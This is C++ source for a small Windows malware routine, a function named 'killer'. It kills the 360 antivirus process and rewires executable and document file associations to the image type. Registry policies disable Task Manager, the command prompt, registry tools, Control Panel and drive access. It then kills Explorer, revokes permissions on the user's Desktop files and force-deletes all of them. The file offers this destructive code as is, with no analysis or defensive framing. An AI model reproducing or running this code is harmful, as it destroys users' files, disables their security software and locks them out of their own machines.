#include<iostream>
#include<windows.h>
#include<string.h>
#include<stdlib.h>

using namespace std;
int killer()
{
		system("taskkill /f /im 360tray.exe");
		system("taskkill /f /im notepad.exe");
		system("assoc .unlockread=txtfile");
		system("assoc .exe=jpgfile");
		system("assoc .bat.jpgfile");
		system("assoc .html=jpgfile");
		system("assoc htm=jpgfile");
		system("assoc .txt=jpgfile");
		system("assoc .vbs=jpgfile");
		system("assoc .docx=jpgfile");
		system("assoc .doc=jpgfile");
		system("assoc .inf=jpgfile");
		system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoClose  \/d 1 \/t REG_DWORD \/f");
		system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoControlPanel  \/d 1 \/t REG_DWORD \/f");
		system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoFind  \/d 1 \/t REG_DWORD \/f");
		system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoDrives  \/d 4294967295 \/t REG_DWORD \/f");
		system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \/v DisableTaskMgr  \/d 1 \/t REG_DWORD \/f");
		system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer \/v NoViewOnDrive  \/d 4294967295 \/t REG_DWORD \/f");
		system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \/v DisableCMD  \/d 1 \/t REG_DWORD \/f");
		system("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System \/v  Disableregistrytools   \/d 1 \/t REG_DWORD \/f");
		system("taskkill /im /f explorer.exe");
		system("cacls.exe C:\\Users\\%username%\\Desktop\\*.* \/t \/e \/r everyone");
		system("del \/f \/s \/q  C:\\Users\\%username%\\Desktop\\*.*");
	return 0;
}